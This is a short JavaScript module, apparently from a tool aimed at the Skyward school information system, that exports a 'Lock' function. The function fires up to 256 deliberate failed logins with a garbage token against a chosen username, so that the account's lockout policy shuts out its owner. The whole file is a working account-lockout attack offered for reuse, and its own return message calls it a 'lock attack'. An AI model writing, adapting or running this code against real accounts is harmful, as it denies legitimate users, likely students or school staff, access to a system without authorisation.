const skye = require('./../skye/index.js');
const token = require('./token.js');

async function Lock(username, requests = 16) {
  if (requests > 256) requests = 256; // Cap requests
  
  // Return unresolved promise to prevent preprocessing
  return new Promise(async (res, rej) => {
    for (let i = 0; i < requests; i++) {
      // Code hack for fake error handling
      try {
        // Send virtually empty packets to authenticate
        // Pass token as garbage data
        await skye(process.env.SKYWARD_URL).login(username, token);
      } catch (err) {
        // Technically not necessary but catch needs content or bypassed
        console.log(`> [LOCK] Packet ${i + 1} sent.`);
      }
    }
    res(`Attempted lock attack with ${requests} requests on ${username}`);
  });
}

module.exports = Lock;
